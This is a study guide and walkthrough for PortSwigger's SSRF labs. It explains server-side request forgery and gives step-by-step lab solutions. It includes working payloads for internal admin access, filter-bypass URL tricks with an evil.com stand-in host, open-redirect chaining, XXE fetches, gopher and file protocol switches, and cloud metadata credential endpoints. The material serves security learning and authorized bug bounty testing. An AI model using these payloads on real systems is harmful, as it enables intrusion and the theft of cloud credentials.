# SSRF Complete Guide — PortSwigger Learning Path
### Server-Side Request Forgery: One-Stop Reference for Bug Bounty Hunters

> **What this guide covers:** Every concept in the PortSwigger SSRF learning path, explained simply, plus step-by-step solutions for all 5 labs.

---

## Table of Contents

1. [What is SSRF?](#1-what-is-ssrf)
2. [Why SSRF is Dangerous (Impact)](#2-why-ssrf-is-dangerous)
3. [Common SSRF Attacks](#3-common-ssrf-attacks)
   - [Lab 1 — Basic SSRF against the local server](#lab-1-basic-ssrf-against-the-local-server)
   - [Lab 2 — Basic SSRF against another back-end system](#lab-2-basic-ssrf-against-another-back-end-system)
4. [Circumventing SSRF Defenses](#4-circumventing-ssrf-defenses)
   - [Blacklist bypass](#41-blacklist-bypass)
   - [Whitelist bypass](#42-whitelist-bypass)
   - [Open redirect bypass](#43-open-redirect-bypass)
   - [Lab 3 — SSRF with blacklist-based input filter](#lab-3-ssrf-with-blacklist-based-input-filter)
   - [Lab 4 — SSRF with filter bypass via open redirection](#lab-4-ssrf-with-filter-bypass-via-open-redirection)
5. [Blind SSRF](#5-blind-ssrf)
   - [Lab 5 — Blind SSRF with out-of-band detection](#lab-5-blind-ssrf-with-out-of-band-detection)
6. [Finding Hidden SSRF Attack Surface](#6-finding-hidden-ssrf-attack-surface)
7. [URL Bypass Cheat Sheet](#7-url-bypass-cheat-sheet)
8. [Bug Bounty Hunting Tips](#8-bug-bounty-hunting-tips)

---

## 1. What is SSRF?

**Simple explanation:** SSRF (Server-Side Request Forgery) is when YOU trick a SERVER into making HTTP requests on your behalf — to places the server should never be talking to.

**Think of it like this:** Imagine a hotel concierge. You're a guest (the attacker). The hotel has a master key card that can open staff-only doors. Instead of asking the concierge to fetch your luggage, you trick him into going into the hotel's private server room and bringing out files. You never had access — but the concierge did.

```
Normal flow:
  You → Server → Public API

SSRF flow:
  You → Server → Internal Admin Panel  ← YOU control this target
               → Cloud Metadata API
               → Other internal servers
```

**Where does SSRF happen?** Anywhere the application accepts a URL as input and then fetches it server-side. Common places:

- Stock check APIs: `stockApi=http://...`
- Webhook URLs: `callback_url=http://...`
- PDF/screenshot generators: `url=http://...`
- File fetchers: `import_from=http://...`
- Image preview: `avatar_url=http://...`

---

## 2. Why SSRF is Dangerous

SSRF can lead to:

| Impact | What it means |
|--------|---------------|
| **Internal network access** | Hit servers that are behind a firewall and not accessible from the internet |
| **Bypass authentication** | Admin panels often trust requests from `localhost` — no password needed |
| **Cloud metadata theft** | On AWS/GCP/Azure, hitting `http://169.254.169.254` leaks API keys and credentials |
| **Remote Code Execution** | In some cases, SSRF chains into RCE on internal services |
| **Port scanning** | Use the server as a proxy to scan what ports are open internally |

**Real-world impact example:** An attacker finds SSRF in a web app running on AWS. They hit `http://169.254.169.254/latest/meta-data/iam/security-credentials/` and get temporary AWS credentials. Now they can access S3 buckets, read databases, and potentially take over the whole AWS account.

---

## 3. Common SSRF Attacks

### 3.1 SSRF Against the Server Itself (Loopback Attack)

The server has special trust for requests coming from `localhost` / `127.0.0.1`. This is because:

- Some access control systems assume "if the request comes from localhost, it must be a trusted internal process"
- Admin panels are sometimes configured to only accept connections from the local machine
- Disaster-recovery features might allow unauthenticated local access

**Normal request (what you see in Burp):**
```http
POST /product/stock HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=6&storeId=1
```

**SSRF payload (what you change it to):**
```http
POST /product/stock HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost/admin
```

The server fetches `http://localhost/admin` as if IT is the client — bypassing any firewall or login protection. The admin panel thinks "oh, this request comes from 127.0.0.1, must be trusted" and hands over the content.

---

### Lab 1: Basic SSRF Against the Local Server

**Difficulty:** Apprentice  
**Goal:** Delete user `carlos` by accessing the admin panel via SSRF

#### Step-by-step solution:

**Step 1:** Open the lab. Browse to any product page and click "Check stock".

**Step 2:** In Burp Suite, intercept that "Check stock" request. You'll see something like:

```http
POST /product/stock HTTP/1.1
...
stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

URL-decoded, the `stockApi` value is:
```
http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

**Step 3:** Change the `stockApi` parameter to:
```
http://localhost/admin
```

Your full request body becomes:
```
stockApi=http://localhost/admin
```

**Step 4:** Send it. The response body will contain the admin panel HTML. Look for a link to delete `carlos` — it'll be something like:

```html
<a href="/admin/delete?username=carlos">Delete</a>
```

**Step 5:** Now change the `stockApi` value to:
```
http://localhost/admin/delete?username=carlos
```

**Step 6:** Send it. Carlos is deleted. Lab solved ✅

#### Why it works:
The app trusts requests from `localhost`. By pointing `stockApi` to `http://localhost/admin`, the server fetches that page as if it's an internal service call — bypassing login checks entirely.

---

### 3.2 SSRF Against Other Back-End Systems

Internal systems often sit on private IP ranges (`192.168.x.x`, `10.x.x.x`, `172.16.x.x`) and don't have authentication because "nobody from the internet can reach them anyway." SSRF breaks that assumption.

**Attack:** You use the vulnerable server as a proxy to talk to these internal systems.

```http
stockApi=http://192.168.0.68/admin
```

You can also **port scan** by trying:
```
http://192.168.0.1:22
http://192.168.0.1:3306
http://192.168.0.1:6379  ← Redis
```

If the response is different for open vs closed ports (timing, error message, size), you can map the internal network.

---

### Lab 2: Basic SSRF Against Another Back-End System

**Difficulty:** Apprentice  
**Goal:** Find an admin interface on an internal IP in the `192.168.0.x` range and delete `carlos`

#### Step-by-step solution:

**Step 1:** Intercept the stock check request in Burp Suite as before.

**Step 2:** You need to scan the `192.168.0.0/24` range to find where the admin panel is. Send the request to **Burp Intruder**.

**Step 3:** Set the `stockApi` parameter to:
```
http://192.168.0.§1§/admin
```

Where `§1§` is your payload position (the last octet).

**Step 4:** In Intruder → Payloads, select **Numbers** type:
- From: `1`
- To: `255`
- Step: `1`

**Step 5:** Start the attack. Watch the **Status** column. Most responses will be errors, but one IP will return HTTP **200**. That's your admin panel. Note the IP (e.g., `192.168.0.125`).

**Step 6:** Change `stockApi` to:
```
http://192.168.0.125/admin/delete?username=carlos
```

**Step 7:** Send it. Lab solved ✅

> **Note:** If you're using Burp Community, Intruder is throttled. Be patient — it'll still work, just slower.

---

## 4. Circumventing SSRF Defenses

Applications often add filters to block SSRF. Here's how to bypass each type.

### 4.1 Blacklist Bypass

The app blocks keywords like `127.0.0.1`, `localhost`, `/admin`.

**Bypass techniques:**

| What's blocked | How to bypass |
|----------------|---------------|
| `127.0.0.1` | `2130706433` (decimal IP) |
| `127.0.0.1` | `017700000001` (octal IP) |
| `127.0.0.1` | `127.1` (short form) |
| `127.0.0.1` | `127.0.0.1.nip.io` (DNS resolves to 127.0.0.1) |
| `localhost` | `LOCALHOST`, `LocalHost` (case variation) |
| `/admin` | `/Admin`, `/ADMIN` |
| `/admin` | `/%61dmin` (URL encoding the `a`) |
| `/admin` | `/%2561dmin` (double URL encoding) |

**Why these work:** The filter checks the raw string for "127.0.0.1" and doesn't find it in "2130706433". But when the HTTP library actually makes the request, it resolves `2130706433` to the loopback IP correctly.

---

### Lab 3: SSRF with Blacklist-Based Input Filter

**Difficulty:** Practitioner  
**Goal:** Bypass the filter that blocks `127.0.0.1`, `localhost`, and `/admin`, then delete `carlos`

#### Step-by-step solution:

**Step 1:** Intercept the stock check request.

**Step 2:** Try your first naive payload:
```
stockApi=http://127.0.0.1/admin
```
→ Blocked. The filter catches `127.0.0.1`.

**Step 3:** Try `localhost`:
```
stockApi=http://localhost/admin
```
→ Blocked. Filter catches `localhost` too.

**Step 4:** Try the decimal representation:
```
stockApi=http://2130706433/admin
```
→ Blocked (the filter might also be catching this).

**Step 5:** Try the short form:
```
stockApi=http://127.1/admin
```
→ Might still be blocked. Try case variation for `/admin`:
```
stockApi=http://127.1/Admin
```
→ If still blocked, try URL encoding the `a` in `admin`:

**Step 6:** Double URL encode `/admin` → `/admin` → `/%61dmin` → `/%2561dmin`

Try:
```
stockApi=http://127.1/%2561dmin
```

The server decodes `%25` → `%` and `61` stays, giving `%61dmin`. The filter doesn't see "admin". The HTTP stack then decodes `%61` → `a`, hitting `/admin`.

**Step 7:** Once you get the admin panel back in the response, look for the delete link and hit:
```
stockApi=http://127.1/%2561dmin/delete?username=carlos
```

Lab solved ✅

> **Key insight:** Filters check at one layer; HTTP execution happens at another layer. Encoding tricks exploit that gap.

---

### 4.2 Whitelist Bypass

Instead of blocking bad input, the app only allows specific values (e.g., "must contain `weliketoshop.net`").

The filter might check: "Does the URL contain `weliketoshop.net`?" — and you can satisfy that while still hitting a different host.

**Bypass techniques using URL structure tricks:**

```
# Credentials trick — put the expected host as a "password"
https://expected-host:fakepassword@evil-host.com
        ↑ allowed value appears here    ↑ actual destination

# Fragment trick — put the expected host in the fragment
https://evil-host.com#expected-host
                      ↑ ignored by HTTP, but filter sees it

# Subdomain trick — make the expected value a subdomain of your domain
https://expected-host.evil-host.com
        ↑ filter sees this and passes it

# URL encoding — confuse the parser
https://evil-host.com/%2F..%2Fexpected-host
```

**Why these work:** URL parsers can disagree on which part is the "host." The filter reads one part; the HTTP library connects to a different part.

---

### 4.3 Open Redirect Bypass

Sometimes the filter is strict — but the **allowed domain** has an open redirect vulnerability.

An open redirect looks like:
```
https://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://evil.com
```

This redirects your browser to `http://evil.com`.

**SSRF exploit:** Chain the open redirect into the SSRF:

```
stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

Flow:
1. Filter checks: "Does URL contain `weliketoshop.net`?" ✅ Yes, passes.
2. Server fetches `http://weliketoshop.net/nextProduct?...path=http://192.168.0.68/admin`
3. That server responds: HTTP 302 → Redirect to `http://192.168.0.68/admin`
4. The HTTP client (server-side) follows the redirect
5. Internal admin panel is now fetched

---

### Lab 4: SSRF with Filter Bypass via Open Redirection

**Difficulty:** Practitioner  
**Goal:** Use the open redirect in the app to bypass the SSRF filter and hit `http://192.168.0.12:8080/admin`

#### Step-by-step solution:

**Step 1:** Intercept the stock check request.

**Step 2:** Try a direct internal IP:
```
stockApi=http://192.168.0.12:8080/admin
```
→ Blocked. Filter rejects IPs not on the whitelist.

**Step 3:** Browse around the app and look for a redirect feature. On product pages, look for a "Next Product" button. Intercept that request:

```
GET /product/nextProduct?currentProductId=1&path=/product?productId=2 HTTP/1.1
```

The `path` parameter controls where you get redirected to.

**Step 4:** Test if the `path` parameter is an open redirect — try changing it to an absolute URL:
```
/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin
```

**Step 5:** Now use this open redirect in your SSRF payload:
```
stockApi=http://YOUR-LAB-HOST/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin
```

(Replace `YOUR-LAB-HOST` with the actual lab hostname like `0a12345.web-security-academy.net`)

**Step 6:** Send it. The filter passes the request (it's to the allowed host). The server follows the redirect to the internal admin panel.

**Step 7:** Find the delete link in the response and change `path` to:
```
http://192.168.0.12:8080/admin/delete?username=carlos
```

Lab solved ✅

---

## 5. Blind SSRF

### What makes it "blind"?

In regular SSRF, you see the response — the admin page content comes back to you.

In **Blind SSRF**, the server still makes the request you told it to — but you **never see the response**. The output goes nowhere visible.

```
Regular SSRF:    You → Server → Internal endpoint → Response returned to YOU

Blind SSRF:      You → Server → Internal endpoint → Response goes /dev/null
                 You only know the request happened (or didn't)
```

### How to detect Blind SSRF

You need **out-of-band (OOB) detection** — make the server ping something YOU control, and watch your listener.

The tool for this: **Burp Collaborator** (built into Burp Suite Pro) or **interactsh** (free, open-source alternative).

**How it works:**
1. Burp Collaborator gives you a unique domain: `xyz123.burpcollaborator.net`
2. You inject that as the SSRF target: `stockApi=http://xyz123.burpcollaborator.net`
3. If the server makes that request, the Collaborator receives a DNS lookup and/or HTTP request
4. Burp shows you "interaction received!" — confirming the SSRF exists

**Free alternative — interactsh:**
```bash
# Install
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Run
interactsh-client

# You'll get a URL like: abc123.oast.fun
# Use that as your SSRF payload target
```

### What can you do with Blind SSRF?

- **Confirm the vulnerability exists** (for bug bounty report)
- **Internal port scanning** — hit `http://192.168.0.1:PORT/` and check if Collaborator gets a response (open port) vs. nothing (closed port)
- **Probe for vulnerabilities** on internal services — send known exploit payloads to internal Elasticsearch, Redis, Jenkins, etc.
- **Potentially achieve RCE** — if an internal service is vulnerable and accepts malicious input via HTTP, blind SSRF can chain into full compromise

---

### Lab 5: Blind SSRF with Out-of-Band Detection

**Difficulty:** Practitioner  
**Goal:** Make the server issue a DNS/HTTP request to your Burp Collaborator URL

#### Step-by-step solution:

**Step 1:** Open Burp Suite Pro → Go to **Burp menu** → **Burp Collaborator client** → Click **"Copy to clipboard"**. You now have a unique domain like `abc123xyz.burpcollaborator.net`.

**Using Burp Suite Community? Use interactsh instead:**
```
https://app.interactsh.com  ← web UI, free, no install
```
Get your unique URL from there.

**Step 2:** Browse to a product page on the lab and click the product to open its detail page. Look at the request — there's a `Referer` header being sent.

This lab is different! The SSRF is in the **Referer header**, not a `stockApi` parameter.

**Step 3:** In Burp, intercept any request to the product page. Find the `Referer` header:
```http
GET /product?productId=1 HTTP/1.1
Host: YOUR-LAB.web-security-academy.net
Referer: https://YOUR-LAB.web-security-academy.net/
```

**Step 4:** Change the `Referer` header to your Collaborator URL:
```http
Referer: http://YOUR-COLLABORATOR-ID.burpcollaborator.net
```

**Step 5:** Send the request.

**Step 6:** In Burp Collaborator client, click **"Poll now"**. You should see an incoming DNS lookup and HTTP request from the lab server.

Lab solved ✅

> **Why the Referer header?** Some applications use server-side analytics software that visits URLs found in Referer headers to analyze referral traffic. This creates an SSRF vector in the Referer header that's easy to miss.

---

## 6. Finding Hidden SSRF Attack Surface

SSRF isn't always obvious. Here's where to hunt for it beyond `stockApi=`:

### 6.1 Partial URLs

The app might only let you control part of the URL:

```
# You control only the hostname
GET /fetch?host=api.example.com

# Server builds: http://api.example.com/data
# Try: host=169.254.169.254  (AWS metadata)
```

Even if you can't control the full URL, you might be able to pivot to internal hosts.

### 6.2 URLs Inside Data Formats

**XML / XXE-based SSRF:**

If the app accepts XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<data>&xxe;</data>
```

The XML parser fetches the URL in the SYSTEM entity. This is XXE + SSRF combined.

**JSON with URL fields:**
```json
{
  "avatar_url": "http://localhost/admin",
  "callback": "http://169.254.169.254/"
}
```

Anywhere a URL appears in a request body — test it.

### 6.3 SSRF via the Referer Header

As seen in Lab 5 — analytics software often "visits" URLs in the Referer header. Change the Referer to an internal address and see what happens.

```http
Referer: http://localhost/admin
Referer: http://192.168.0.1/
Referer: http://169.254.169.254/
```

### 6.4 Other Headers to Try

```http
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
Host: localhost
```

Some apps use these headers to determine the "source" of a request and grant extra trust.

### 6.5 Cloud Metadata Endpoints (Critical for Bug Bounty)

These are gold if you find SSRF:

```
AWS:     http://169.254.169.254/latest/meta-data/
         http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME

GCP:     http://metadata.google.internal/computeMetadata/v1/
         (requires header: Metadata-Flavor: Google)

Azure:   http://169.254.169.254/metadata/instance?api-version=2021-02-01
         (requires header: Metadata: true)

Digital Ocean: http://169.254.169.254/metadata/v1/
```

Getting credentials from cloud metadata via SSRF is often rated **Critical** on bug bounty platforms.

---

## 7. URL Bypass Cheat Sheet

Quick reference for filter bypasses in one place:

### Localhost Alternatives

```
http://127.0.0.1/
http://localhost/
http://127.1/
http://0/
http://0.0.0.0/
http://[::1]/              ← IPv6 loopback
http://[::]/               ← IPv6 all zeros
http://2130706433/         ← 127.0.0.1 in decimal
http://017700000001/       ← 127.0.0.1 in octal
http://0x7f000001/         ← 127.0.0.1 in hex
http://127.0.0.1.nip.io/  ← DNS resolves to 127.0.0.1
http://spoofed.burpcollaborator.net/  ← resolves to 127.0.0.1
```

### Encoding Tricks

```
/admin           → /%61dmin        (URL encode 'a')
/admin           → /%2561dmin      (double encode)
127.0.0.1        → 127.0.0.1%09   (tab after IP, some parsers strip it)
localhost        → LOCALHOST       (uppercase)
localhost        → localHOST       (mixed case)
```

### Whitelist Bypass URL Structures

```
# @ trick — credentials section
http://allowed-host@evil.com/

# # trick — fragment
http://evil.com#allowed-host

# Subdomain trick
http://allowed-host.evil.com/

# Double slash tricks
http://evil.com//allowed-host

# Path confusion
http://evil.com/allowed-host/../../../
```

### Protocol Switches

```
http://  → https://   (try both)
http://  → dict://    (dict protocol, can interact with Redis)
http://  → ftp://     (FTP)
http://  → file:///etc/passwd   (local file read!)
http://  → gopher://  (powerful, can talk to raw TCP services)
```

---

## 8. Bug Bounty Hunting Tips

### How to Find SSRF in the Wild

**Step 1 — Identify URL inputs.** Look for any parameter that accepts a URL or hostname:
```
url=, path=, src=, href=, redirect=, callback=, dest=, host=,
image_url=, avatar=, import=, fetch=, load=, webhook=, api=
```

**Step 2 — Intercept with Burp.** Enable "Intercept" and browse every feature. Check the request body AND headers.

**Step 3 — Try the obvious first.** Replace the URL value with your Collaborator/interactsh URL and see if you get a ping.

**Step 4 — If pinged, escalate.** Try hitting cloud metadata, internal ranges, and sensitive endpoints.

**Step 5 — If blocked, try bypasses.** Work through the bypass list systematically.

### How to Write a Good SSRF Bug Report

A minimal valid SSRF report needs:

1. **Vulnerable endpoint** — exact URL, method, parameter name
2. **Payload used** — exact value you sent
3. **Evidence** — screenshot of Burp Collaborator receiving the DNS/HTTP request, or screenshot showing internal content returned
4. **Impact** — what could an attacker do? (access metadata, hit internal APIs, etc.)

**Example report summary:**
```
Endpoint: POST /api/preview
Parameter: url
Payload: http://169.254.169.254/latest/meta-data/
Evidence: Server returned AWS instance metadata including IAM role name
Impact: An attacker can retrieve AWS credentials via the metadata endpoint,
        potentially leading to full account compromise.
```

### Severity Ratings (HackerOne context)

| SSRF Type | Typical Rating |
|-----------|---------------|
| Blind SSRF, no impact proven | Low–Medium |
| Internal port scan confirmed | Medium |
| Access to internal admin panel | High |
| Cloud metadata credentials exfiltration | Critical |
| RCE via internal service | Critical |

---

## Quick Reference — All 5 Labs

| Lab | Type | Key Trick | Payload |
|-----|------|-----------|---------|
| Lab 1 | Basic SSRF | Hit localhost admin | `stockApi=http://localhost/admin/delete?username=carlos` |
| Lab 2 | Internal network | Scan 192.168.0.x | `stockApi=http://192.168.0.X/admin/delete?username=carlos` |
| Lab 3 | Blacklist bypass | Double URL encode | `stockApi=http://127.1/%2561dmin/delete?username=carlos` |
| Lab 4 | Open redirect | Chain redirect | `stockApi=http://ALLOWED-HOST/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos` |
| Lab 5 | Blind SSRF | Referer header + Collaborator | `Referer: http://YOUR-COLLABORATOR.burpcollaborator.net` |

---

## Tools You Need

| Tool | Purpose | Get it |
|------|---------|--------|
| Burp Suite Community | Intercept & modify requests | portswigger.net/burp/communitydownload |
| Burp Collaborator | OOB detection (Pro only) | Built into Burp Pro |
| interactsh | Free Collaborator alternative | github.com/projectdiscovery/interactsh |
| FoxyProxy | Browser proxy toggle | Firefox/Chrome extension |

---

*Guide based on PortSwigger Web Security Academy — SSRF Learning Path*  
*Updated: 2026 | For educational and authorized testing only*
